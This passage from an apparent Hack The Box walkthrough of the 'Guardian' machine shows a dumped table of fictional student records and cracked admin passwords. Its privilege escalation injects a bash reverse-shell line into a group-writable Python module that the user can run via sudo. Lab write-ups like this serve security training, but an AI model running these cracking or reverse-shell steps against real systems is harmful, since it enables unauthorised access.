|      18 | GU9612024          | cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57 | Shawnee Bazire       | GU9612024@guardian.htb          | 2002-05-27 | 4364 Guadalupe Court, Pensacola, Florida, United States, 32520                | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      19 | GU7382024          | 7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a | Jobey Dearle-Palser  | GU7382024@guardian.htb          | 1998-04-14 | 4620 De Hoyos Place, Tampa, Florida, United States, 33625                     | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      20 | GU6632023          | 98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714 | Erika Sandilands     | GU6632023@guardian.htb          | 1994-06-08 | 1838 Herlong Court, San Bernardino, California, United States, 92410          | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      21 | GU1922024          | bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd | Alisander Turpie     | GU1922024@guardian.htb          | 1998-08-07 | 813 Brody Court, Bakersfield, California, United States, 93305                | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      22 | GU8032023          | 41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada | Wandie McRobbie      | GU8032023@guardian.htb          | 2002-01-16 | 5732 Eastfield Path, Peoria, Illinois, United States, 61629                   | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      23 | GU5852023          | e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a | Erinn Franklyn       | GU5852023@guardian.htb          | 2003-05-01 | 50 Lindsey Lane Court, Fairbanks, Alaska, United States, 99790                | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      24 | GU0712023          | e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a | Niel Slewcock        | GU0712023@guardian.htb          | 1996-05-04 | 3784 East Schwartz Boulevard, Gainesville, Florida, United States, 32610      | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      25 | GU1592025          | 1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71 | Chryste Lamputt      | GU1592025@guardian.htb          | 1993-05-22 | 6620 Anhinga Lane, Baton Rouge, Louisiana, United States, 70820               | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      26 | GU1112023          | 168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d | Kiersten Rampley     | GU1112023@guardian.htb          | 1997-06-28 | 9990 Brookdale Court, New York City, New York, United States, 10292           | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      27 | GU6432025          | a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6 | Gradeigh Espada      | GU6432025@guardian.htb          | 1999-06-06 | 5464 Lape Lane, Boise, Idaho, United States, 83757                            | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      28 | GU3042024          | d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab | Susanne Myhill       | GU3042024@guardian.htb          | 2003-04-12 | 11585 Homan Loop, Aiken, South Carolina, United States, 29805                 | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      29 | GU1482025          | be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f | Prudi Sweatman       | GU1482025@guardian.htb          | 1998-05-10 | 1533 Woodmill Terrace, Palo Alto, California, United States, 94302            | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      30 | GU3102024          | 3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706 | Kacey Qualtrough     | GU3102024@guardian.htb          | 1996-03-09 | 14579 Ayala Way, Spokane, Washington, United States, 99252                    | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      31 | GU7232023          | 4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6 | Thedrick Grimstead   | GU7232023@guardian.htb          | 1998-05-20 | 13789 Castlegate Court, Salt Lake City, Utah, United States, 84130            | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      32 | GU8912024          | 6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51 | Dominik Clipsham     | GU8912024@guardian.htb          | 1999-06-30 | 7955 Lock Street, Kansas City, Missouri, United States, 64160                 | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      33 | GU4752025          | 4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a | Iain Vinson          | GU4752025@guardian.htb          | 1990-10-13 | 10384 Zeeland Terrace, Cleveland, Ohio, United States, 44105                  | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      34 | GU9602024          | 6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2 | Ax Sweating          | GU9602024@guardian.htb          | 1994-06-22 | 4518 Vision Court, Sarasota, Florida, United States, 34233                    | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      35 | GU4382025          | 8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8 | Trixi Piolli         | GU4382025@guardian.htb          | 2001-02-02 | 11634 Reid Road, Charleston, South Carolina, United States, 29424             | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      36 | GU7352023          | 8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005 | Ronni Fulton         | GU7352023@guardian.htb          | 1998-11-07 | 4690 Currituck Terrace, Vero Beach, Florida, United States, 32964             | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      37 | GU3042025          | 1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f | William Lidstone     | GU3042025@guardian.htb          | 1998-03-18 | 11566 Summerchase Loop, Providence, Rhode Island, United States, 02905        | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      38 | GU3872024          | 12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a | Viola Bridywater     | GU3872024@guardian.htb          | 2003-07-21 | 9436 Erica Chambers Avenue, Bronx, New York, United States, 10454             | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      39 | GU7462025          | 5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa | Glennie Crilly       | GU7462025@guardian.htb          | 1995-01-26 | 3423 Carla Fink Court, Washington, District of Columbia, United States, 20580 | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      40 | GU3902023          | 6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b | Ninnette Lenchenko   | GU3902023@guardian.htb          | 1994-11-06 | 12277 Richey Road, Austin, Texas, United States, 78754                        | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      41 | GU1832025          | 6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f | Rivalee Coche        | GU1832025@guardian.htb          | 1990-10-23 | 2999 Indigo Avenue, Washington, District of Columbia, United States, 20022    | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      42 | GU3052024          | 1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f | Lodovico Atlay       | GU3052024@guardian.htb          | 1992-04-16 | 5803 Clarendon Court, Little Rock, Arkansas, United States, 72231             | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      43 | GU3612023          | 7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a | Maris Whyborne       | GU3612023@guardian.htb          | 1999-08-07 | 435 Quaint Court, Staten Island, New York, United States, 10305               | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      44 | GU7022023          | 7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8 | Diahann Forber       | GU7022023@guardian.htb          | 1998-12-17 | 10094 Ely Circle, New Haven, Connecticut, United States, 06533                | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      45 | GU1712025          | ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225 | Sinclair Tierney     | GU1712025@guardian.htb          | 1999-11-04 | 2885 Columbia Way, Seattle, Washington, United States, 98127                  | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      46 | GU9362023          | 8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592 | Leela Headon         | GU9362023@guardian.htb          | 1992-10-24 | 14477 Donelin Circle, El Paso, Texas, United States, 88589                    | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      47 | GU5092024          | 11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380 | Egon Jaques          | GU5092024@guardian.htb          | 1995-04-19 | 12886 Chimborazo Way, Fort Lauderdale, Florida, United States, 33315          | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      48 | GU5252023          | 70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa | Meade Newborn        | GU5252023@guardian.htb          | 2003-09-02 | 3679 Inman Mills Road, Orlando, Florida, United States, 32859                 | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      49 | GU8802025          | 7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76 | Tadeo Sproson        | GU8802025@guardian.htb          | 2002-08-01 | 4293 Tim Terrace, Springfield, Illinois, United States, 62776                 | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      50 | GU2222023          | d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd | Delia Theriot        | GU2222023@guardian.htb          | 2001-07-15 | 5847 Beechwood Avenue, Chattanooga, Tennessee, United States, 37450           | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      51 | GU9802023          | a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c | Ransell Dourin       | GU9802023@guardian.htb          | 1995-01-04 | 1809 Weaton Court, Chattanooga, Tennessee, United States, 37410               | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      52 | GU3122025          | e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a | Franklyn Kuhndel     | GU3122025@guardian.htb          | 1991-06-05 | 11809 Mccook Street, Shawnee Mission, Kansas, United States, 66210            | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      53 | GU2062025          | 0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8 | Petronille Scroggins | GU2062025@guardian.htb          | 2001-06-16 | 11794 Byron Place, Des Moines, Iowa, United States, 50981                     | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      54 | GU3992025          | b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0 | Kittie Maplesden     | GU3992025@guardian.htb          | 2001-10-04 | 6212 Matisse Avenue, Palatine, Illinois, United States, 60078                 | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      55 | GU1662024          | 5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5 | Gherardo Godon       | GU1662024@guardian.htb          | 2002-04-17 | 9997 De Hoyos Place, Simi Valley, California, United States, 93094            | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      56 | GU9972025          | 339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599 | Kippar Surpliss      | GU9972025@guardian.htb          | 1990-08-10 | 5372 Gentle Terrace, San Francisco, California, United States, 94110          | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      57 | GU6822025          | 298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482 | Sigvard Reubens      | GU6822025@guardian.htb          | 2003-04-23 | 5711 Magana Place, Memphis, Tennessee, United States, 38104                   | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      58 | GU7912023          | 8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021 | Carly Buckler        | GU7912023@guardian.htb          | 1991-09-07 | 2298 Hood Place, Springfield, Massachusetts, United States, 01105             | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      59 | GU3622024          | 1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf | Maryjo Gration       | GU3622024@guardian.htb          | 1997-04-25 | 1998 Junction Place, Irvine, California, United States, 92619                 | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      60 | GU2002023          | 3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2 | Paulina Mainwaring   | GU2002023@guardian.htb          | 1993-05-04 | 11891 Markridge Loop, Olympia, Washington, United States, 98506               | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      61 | GU3052023          | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 | Curran Foynes        | GU3052023@guardian.htb          | 2000-12-04 | 7021 Cordelia Place, Paterson, New Jersey, United States, 07505               | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
|      62 | GU1462023          | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 | Cissy Styan          | GU1462023@guardian.htb          | 1991-01-10 | 1138 Salinas Avenue, Orlando, Florida, United States, 32854                   | student   | active | 2025-10-24 12:00:02 | 2025-10-24 12:00:02 |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
62 rows in set (0.00 sec)
```

There's 3 users with **admin** ``user_role`` which is **admin**, **jamil** and **mark**
*p/s:don't forget it included salt from the hash, so we need those to decrypt*

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ cat hash.txt 
admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
mark.pargetter:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
```
### hashcat

<img width="1116" height="590" alt="image" src="https://github.com/user-attachments/assets/459af29f-d779-435f-a0f4-1f164f421d15" />

Hash format was  `` $password = hash('sha256', $password . $salt);`` from **[createuser.php](http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/admin/createuser.php)**

```
 ──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ hashcat -hh | grep -i sha256
   1470 | sha256(utf16le($pass))                                     | Raw Hash
   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
   1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
  22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
  20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
  21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
   1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
  20730 | sha256(sha256($pass.$salt))                                | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated
   1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
   1450 | HMAC-SHA256 (key = $pass)                                  | Raw Hash authenticated
   1460 | HMAC-SHA256 (key = $salt)                                  | Raw Hash authenticated
  10900 | PBKDF2-HMAC-SHA256                                         | Generic KDF
  30601 | bcrypt(HMAC-SHA256($pass))                                 | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  26800 | SNMPv3 HMAC-SHA256-192                                     | Network Protocol
   6400 | AIX {ssha256}                                              | Operating System
  19100 | QNX /etc/shadow (SHA256)                                   | Operating System
  12800 | MS-AzureSync PBKDF2-HMAC-SHA256                            | Operating System
  33700 | Microsoft Online Account (PBKDF2-HMAC-SHA256 + AES256)     | Operating System
   9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                              | Operating System
   5700 | Cisco-IOS type 4 (SHA256)                                  | Operating System
   5720 | Cisco-ISE Hashed Password (SHA256)                         | Operating System
  33900 | Citrix NetScaler (PBKDF2-HMAC-SHA256)                      | Operating System
   7400 | sha256crypt $5$, SHA256 (Unix)                             | Operating System
   7401 | MySQL $A$ (sha256crypt)                                    | Database Server
   1411 | SSHA-256(Base64), LDAP {SSHA256}                           | FTP, HTTP, SMTP, LDAP Server
  10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                    | FTP, HTTP, SMTP, LDAP Server
  20712 | RSA Security Analytics / NetWitness (sha256)               | Enterprise Application Software (EAS)
  32060 | NetIQ SSPR (PBKDF2WithHmacSHA256)                          | Enterprise Application Software (EAS)
  20600 | Oracle Transportation Management (SHA256)                  | Enterprise Application Software (EAS)
  20711 | AuthMe sha256                                              | Enterprise Application Software (EAS)
  22400 | AES Crypt (SHA256)                                         | Full-Disk Encryption (FDE)
  13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)        | Full-Disk Encryption (FDE)
  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  29451 | VeraCrypt SHA256 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29452 | VeraCrypt SHA256 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29453 | VeraCrypt SHA256 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
  29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                 | Full-Disk Encryption (FDE)
  29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                | Full-Disk Encryption (FDE)
  29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                | Full-Disk Encryption (FDE)
  27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)              | Full-Disk Encryption (FDE)
  27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)              | Full-Disk Encryption (FDE)
  16501 | Perl Mojolicious session cookie (HMAC-SHA256, >= v9.19)    | Framework
  10000 | Django (PBKDF2-SHA256)                                     | Framework
  30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))         | Framework
  20300 | Python passlib pbkdf2-sha256                               | Framework
  24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)        | Private Key
  22301 | Telegram Mobile App Passcode (SHA256)                      | Instant Messaging Service
  30700 | Anope IRC Services (enc_sha256)                            | Instant Messaging Service
  18800 | Blockchain, My Wallet, Second Password (SHA256)            | Cryptocurrency Wallet
  16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256               | Cryptocurrency Wallet
  15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                        | Cryptocurrency Wallet
```

we will use **1410** for ``sha256(pass.salt)``

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ hashcat -m 1410 hash.txt -w 3 -O /usr/share/wordlists/rockyou.txt --username
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11370H @ 3.30GHz, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 3 digests; 3 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Appended-Salt
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1248 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: hash.txt
Time.Started.....: Fri Oct 24 21:00:42 2025 (8 secs)
Time.Estimated...: Fri Oct 24 21:00:50 2025 (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-31 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1715.1 kH/s (1.07ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 2/3 (66.67%) Digests (total), 2/3 (66.67%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 3094/14344385 (0.02%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: !!rebound!! -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 83%

Started: Fri Oct 24 21:00:13 2025
Stopped: Fri Oct 24 21:00:51 2025
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ hashcat -m 1410 hash.txt --show --username
Mixing --show with --username or --dynamic-x can cause exponential delay in output.

admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
```

## Shell as jamil

We got 2 set of creds which is **admin** and **jamil**, We can use this known creds to SSH as we known that **[port 22](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=22)** is running from previous nmap scan.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ ssh jamil@guardian.htb
jamil@guardian.htb's password:copperhouse56
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Oct 24 12:38:19 PM UTC 2025

  System load:  0.0               Processes:             249
  Usage of /:   79.2% of 8.12GB   Users logged in:       0
  Memory usage: 33%               IPv4 address for eth0: 10.10.11.84
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

8 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update                                                                                                                                                                      
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                              

-bash-5.1$ whoami
jamil 

```

### User flag 

```
-bash-5.1$ ls -lah
total 40K
drwxr-x--- 4 jamil jamil 4.0K Oct 24 11:47 .
drwxr-xr-x 6 root  root  4.0K Jul 30 14:59 ..
lrwxrwxrwx 1 root  root     9 Jul 14 16:57 .bash_history -> /dev/null
-rw-r--r-- 1 jamil jamil  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 jamil jamil 3.8K Apr 19  2025 .bashrc
drwx------ 2 jamil jamil 4.0K Apr 26 17:27 .cache
-rw-rw-r-- 1 jamil jamil  155 Oct 24 11:44 evil.c
-rw------- 1 jamil jamil   20 Oct 24 11:47 .lesshst
drwxrwxr-x 3 jamil jamil 4.0K Oct 24 04:10 .local
lrwxrwxrwx 1 root  root     9 Apr 12  2025 .mysql_history -> /dev/null
-rw-r--r-- 1 jamil jamil  807 Jan  6  2022 .profile
-rw-r----- 1 root  jamil   33 Oct 23 19:34 user.txt
-bash-5.1$ cat /home/jamil/user.txt 
0b7ef55238992c4597b61c912afee1d9
```
After some priv esc checks, we find that:
```
-bash-5.1$ sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py

-bash-5.1$ groups
jamil admins
```
jamil may run **/opt/scripts/utilities/utilities.py** as ``mark``, meaning next we need to esc to as ``mark`` and jamil also was in ``admins`` group.

```
-bash-5.1$ ls -lah /opt/scripts/utilities/            
total 20K
drwxr-sr-x 4 root admins 4.0K Jul 10 13:53 .
drwxr-xr-x 3 root root   4.0K Jul 12 15:10 ..
drwxrws--- 2 mark admins 4.0K Jul 10 13:53 output
-rwxr-x--- 1 root admins 1.2K Apr 20  2025 utilities.py
drwxrwsr-x 2 root root   4.0K Jul 10 14:20 utils
-bash-5.1$ cat /opt/scripts/utilities/utilities.py
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```
### import function rewrite with group privilege

All functions required user to be ``mark`` but all user can run ``sytem_status`` functions that import from ``utils/status``

```
-bash-5.1$ ls -lah /opt/scripts/utilities/utils/
total 24K
drwxrwsr-x 2 root root   4.0K Jul 10 14:20 .
drwxr-sr-x 4 root admins 4.0K Jul 10 13:53 ..
-rw-r----- 1 root admins  287 Apr 19  2025 attachments.py
-rw-r----- 1 root admins  246 Jul 10 14:20 db.py
-rw-r----- 1 root admins  226 Apr 19  2025 logs.py
-rwxrwx--- 1 mark admins  361 Oct 24 13:10 status.py
```
We are in the same ``admins`` group so we would be able to edit this file

```
-bash-5.1$ nano /opt/scripts/utilities/utils/status.py 
-bash-5.1$ cat /opt/scripts/utilities/utils/status.py 
# status.py 
import platform
import psutil
import os
import subprocess

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    subprocess.run(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.10.10.14.113/1235 0>&1"])

```
setup a listener for a reverse shell
```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ penelope -p 1235
[+] Listening for reverse shells on 0.0.0.0:1235 →  127.0.0.1 • 192.168.134.128 • 10.10.14.113
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)

```
run ``/opt/scripts/utilities/utilities.py`` **as** ``mark`` **with** ``system-status`` functions
```
-bash-5.1$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
System: Linux 5.15.0-152-generic
CPU usage: 0.0 %
Memory usage: 34.8 %
```

## Shell as mark

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ penelope -p 1235
[+] Listening for reverse shells on 0.0.0.0:1235 →  127.0.0.1 • 192.168.134.128 • 10.10.14.113
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.10.11.84-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/guardian~10.10.11.84-Linux-x86_64/2025_10_25-04_24_38-224.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────
mark@guardian:/home/jamil$ whoami
mark
```

### discovery as mark

user ``mark`` was able to run ``/usr/local/bin/safeapache2ctl`` as **sudo**, so should be this is our lead to root privileges.
```
mark@guardian:/home/jamil$ sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass,
